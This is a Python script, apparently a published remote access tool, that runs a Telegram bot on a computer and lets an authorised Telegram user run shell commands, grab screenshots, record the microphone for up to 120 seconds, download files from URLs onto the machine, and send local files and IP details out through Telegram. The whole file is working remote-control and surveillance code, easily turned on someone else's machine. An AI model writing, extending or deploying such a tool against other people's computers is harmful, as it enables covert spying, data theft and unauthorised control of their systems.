#!/usr/bin/python
#Ny4rlk0's Remote Terminal Telegram Access Tool
#Programı ben yazmış olabilirim ama kullananlara hiçbir şekilde garanti vermemekteyim.
#Tamamiyle kendi sorumluluğunuzla kullanın.
#Ny4rlk0 hiçbir yasal sorumluluk kabul etmemektedir.
#Ny4rlk0 does not accept any kind of legal liability from this program. Use it at your own risk!
#https://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/
#BTC: 3NhGAPpkLas1pDdPp7tSeP5ba1gHapq7kb
import telepot,telepot.loop,telepot.namedtuple
import sqlite3,threading,os,time,pprint,random,validators,base64,json,subprocess
import configparser as c
import subprocess as sp
import requests as rq
from PIL import ImageGrab as sc
import socket
import sounddevice as sd
from scipy.io.wavfile import write
import wavio as wv
import numpy as np


nya=0
rlko=0
lang="tr" #For english type en. Türkçe için tr yazın.
ROOT_ACCESS=[934124953] #Let'secure our access to computer with Telegram user id. Bilgisayara erişimimizi telegram id'miz ile güvenceye alalım.
xTOXEN="12341321:DA2doSKDWAD232SD2sDW23S" #Add your own toxen here. Buraya kendi toxeninizi yazın.
db_exists=os.path.exists("database.db")
conn=sqlite3.connect("database.db", check_same_thread=False)
cur=conn.cursor()
xdir=os.getcwd()
tr_menu=telepot.namedtuple.ReplyKeyboardMarkup(
    keyboard=[
        [telepot.namedtuple.KeyboardButton(text="/userid"),
        telepot.namedtuple.KeyboardButton(text="/rec 120")],
        [telepot.namedtuple.KeyboardButton(text="/ss"),
        telepot.namedtuple.KeyboardButton(text="/ip"),
        telepot.namedtuple.KeyboardButton(text="/yardim")]
    ],
    resize_keyboard=True
)
en_menu=telepot.namedtuple.ReplyKeyboardMarkup(
    keyboard=[
        [telepot.namedtuple.KeyboardButton(text="/userid"),
        telepot.namedtuple.KeyboardButton(text="/rec 120")],
        [telepot.namedtuple.KeyboardButton(text="/ss"),
        telepot.namedtuple.KeyboardButton(text="/ip"),
        telepot.namedtuple.KeyboardButton(text="/help")]
    ],
    resize_keyboard=True
)
try:
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
except:
    if lang=="tr":
        ip="Bilinmiyor."
        hostname="Bilinmiyor."
    else:
        ip="Unknown."
        hostname="Unknown."
    pass
try:
    external_ip = rq.get('https://api.ipify.org').text
except:
    if lang=="tr":
        external_ip="Bilinmiyor."
    else:
        external_ip="Unknown."
    pass
if not db_exists:
    cur.execute("CREATE TABLE user (id INT, username CHAR(50), firstname VARCHAR(51),lastname CHAR(52))")
    conn.commit()
    del cur
set_exists=os.path.exists("degerler.txt")
if not set_exists:
    cp = c.RawConfigParser()
    cp.add_section('veri')
    cp.set('veri', 'TOXEN', xTOXEN)
    setup = open('degerler.txt', 'w')
    cp.write(setup)
    setup.close()
nya = c.RawConfigParser()
nya.read('degerler.txt')
TOXEN = nya['veri'] ['TOXEN']
bot=telepot.Bot(TOXEN)
def access(command): #Access the terminal. Komut satırına erişim.
    global output
    try:
        output = sp.getoutput(f"""{command}""")
        print(output)
    except Exception as e:
        globalMessage(e)
        pass
def eagleye(): #Capture screen photo. Ekran resmini kaydet.
    global spp
    try:
        ss_name="EagleEye.jpg"
        spp=os.path.join(xdir,ss_name)
        ss=sc.grab()
        ss.save(spp)
    except:
        pass
def batears(battime): #Capture the microphone. Bilgisayarın mikrofonunu kaydet.
    #time=time*60 #Convert to minute. Saniyeyi dakikaya çevirelim.
    batname="batears.wav"
    batpath=os.path.join(xdir,batname)
    try:
        freq=44100 #Sample rate
        sd.default.samplerate=freq
        sd.default.channels=2
        recr=sd.rec(int(battime*freq), dtype='float32')
        sd.wait() #Wait until rec finish.
        write(batname,freq,recr) #Save file.
        sendFile(batpath,True)
    except:
        pass
def download(url,filename):
    try:
        r = rq.get(url, allow_redirects=True)
        open(filename, 'wb').write(r.content)
    except:
        pass
def handle(msg):
   global userid,chatid
   try:
    pprint.pprint(msg)
    cur=conn.cursor()
    et="@"
    userid=msg["from"]["id"]
    chatid=msg["chat"]["id"]
    try:
        username=et+msg["from"]["username"]
    except:
        username=""
    try:
        firstname=msg["from"]["first_name"]
    except:
        firstname=""
    try:
        lastname=msg["from"]["last_name"]
    except:
        lastname=""
    data=""
    if "data" in msg.keys():
        data=msg["data"]
    text=""
    if "document" in msg.keys():
        text="FileID:"+msg["document"]["file_id"]
    elif "photo" in msg.keys():
        text="FileID:"+msg["photo"][0]["file_id"]
    else:
        text=msg["text"]
    global sendFile,globalMessage
    def globalMessage(msg):
        try:
            msg=str(msg)
            bot.sendMessage(f"{msg}")
        except:
            pass
    def sendFile(filename,removefile):
        try:
            bot.sendDocument(chatid,open(filename,"rb"))#fileid)
            if removefile==True:
                os.remove(filename)
        except Exception as e:
            bot.sendMessage(chatid,e)
            pass
    def sendImg(): #Send screen capture image to telegram. Telegram hesabımıza ekran görüntüsünü yollayalım.
        try:
            bot.sendPhoto(chatid, photo=open(spp, 'rb'))
            os.remove(spp) #Delete the file after sent. Yolladıktan sonra dosyayı silelim.
        except:
            pass
    if text.startswith("/x ") and userid in ROOT_ACCESS: #Check if user has rights to access our computer via telegram id. Kullanıcının bilgisayarımıza erişimi olup olmadığınız telegram id ile konrol edelim.
        execute=text.replace("/x ","")
        print(execute)
        access(execute)
        bot.sendMessage(chatid,f"{output}")
    elif text.startswith("/userid"):
        if lang=="tr":
            bot.sendMessage(chatid,f"Sizin User ID'niz: {userid}\nBu bilgiyi kimse ile paylaşmayınız.")
        else:
            bot.sendMessage(chatid,f"Your User ID is: {userid}\nDo not share this information to anyone.")
    elif text=="/yardim" or text=="/help" or text=="/menu" or text=="/menü":
        if lang=="tr":
            bot.sendMessage(chatid,"Nyarlko tarafından yazılmıştır.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nKomutlar:\n/x Komut satırına yazacağın komut.\n/ss Ekran alıntısını alır ve sana yollar.\n/d https://indirme.linki dosyadi.exe Dosyayı bilgisayarınıza indirir.\n/ip Ip adresinizi gösterir.\n/userid User ID numaranızı gösterir.\n/rec 1-120 Saniye cinsinden bilgisayara bağlı mikrofon ile kayıt yapar.\nNot: Kayıt yaparken Windows altta mikrofon simgesi çıkarıyor.\n/menu bu menüyü açar.\n/up C:/a.txt dosyasını telegrama yükler.\nDikkat: 50 MB üstü dosyaları yükleyemezsiniz.",reply_markup=tr_menu)
        else:
            bot.sendMessage(chatid,"Written by Nyarlko.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nCommands:\n/x Command you wanna execute.\n/ss screenshot the computer.\n/d https://download.link filename.exe Downloads the file.\n/ip Shows your ip address.\n/userid Will show your User ID number.\n/rec 1-120 (Sec) Will record from computers microphone and send you as wav file.\nWarning: Windows shows microphone icon at taskbar.\n/menu will open this menu.\n/up C:/a.txt uploads a.txt to telegram.\nWarning: You can not upload files bigger than 50 MB.",reply_markup=en_menu)
        if userid in ROOT_ACCESS:
            if lang=="tr":
                bot.sendMessage(chatid,"Admin yetkiniz vardır.")
            else:
                bot.sendMessage(chatid,"You have Admin access.")
        else:
            if lang=="tr":
                bot.sendMessage(chatid,"Admin yetkiniz yoktur.")
            else:
                bot.sendMessage(chatid,"You don't have Admin access.")
    elif text.startswith("/ss") and userid in ROOT_ACCESS:
        eagleye()
        sendImg()
    elif text.startswith("/d ") and userid in ROOT_ACCESS:
        try:
            url=text.replace("/d ","")
            url,filename=url.split(" ")
            try:
                download(url,filename)
            except:
                if lang=="tr":
                    bot.sendMessage(chatid,f"{filename} indirilirken hata ile karşılaşıldı.")
                else:
                    bot.sendMessage(chatid,f"Failed while downloading {filename}.")
                pass
            else:
                if lang=="tr":
                    bot.sendMessage(chatid,f"{filename} başarıyla indirildi.")
                else:
                    bot.sendMessage(chatid,f"{filename} downloaded successfully.")
            if lang=="tr":
                print(url,filename+" indirildi.")
            else:
                print(url,filename+" has downloaded.")
        except:
            pass
    elif text.startswith("/ip") and userid in ROOT_ACCESS:
        if lang=="tr":
            bot.sendMessage(chatid,f"Dahili IP: {ip}\nHost Adı: {hostname}\nHarici IP: {external_ip}")
        else:
            bot.sendMessage(chatid,f"Internal IP: {ip}\nHost Name: {hostname}\nExternal IP: {external_ip}")
    elif text.startswith("/rec ") and userid in ROOT_ACCESS:
        size_check=True
        battime=text.replace("/rec ","")
        try:
            battime=int(battime)
        except Exception as e:
            size_check=False
            if lang=="tr":
                bot.sendMessage(chatid,f"{e}\nÖzet olarak diyor ki; sayı yazacağın yere neden saçma saçma şeyler yazıyosun.")
            else:
                bot.sendMessage(chatid,f"{e}\nPlease type a number.")
            pass
        if battime > 120 or battime < 0:
            size_check=False
            if lang=="tr":
                bot.sendMessage(chatid,f"120 saniyeden fazla ses kaydı yapamazsınız.")
            else:
                bot.sendMessage(chatid,f"""Can't record more then 120 seconds.""")
        try:
            if size_check==True:
                batears(battime)
        except:
            pass
    elif text.startswith("/up ") and userid in ROOT_ACCESS:
        file_dir=text.replace("/up ","")
        try: #Execute. Çalıştır.
            file_size=os.path.getsize(file_dir)
        except: #Error. Hata.
            if lang=="tr":
                bot.sendMessage(chatid,"Dosya bulunamadı!")
            else:
                bot.sendMessage(chatid,"File not found.")
        else: #Succesfull. Başarılı.
            if file_size <= 50000000: #İf file size smaller then 50 mb since its telegrams bot limit. Dosya boyutu 50 mb küçükse telegramın bot limiti bu üstünü kabul etmiyor.
                sendFile(file_dir,False)
            else:
                if lang=="tr":
                    bot.sendMessage(chatid,f"Dosya boyutu telegramın botlar için sınırı olan 50 MB'tan büyük!")
                else:
                    bot.sendMessage(chatid,f"File size is bigger than 50 MB.\nThis is limitation from telegram for bot api.")
   except:
    pass
if __name__=="__main__":
    telepot.loop.MessageLoop(bot,handle).run_forever()
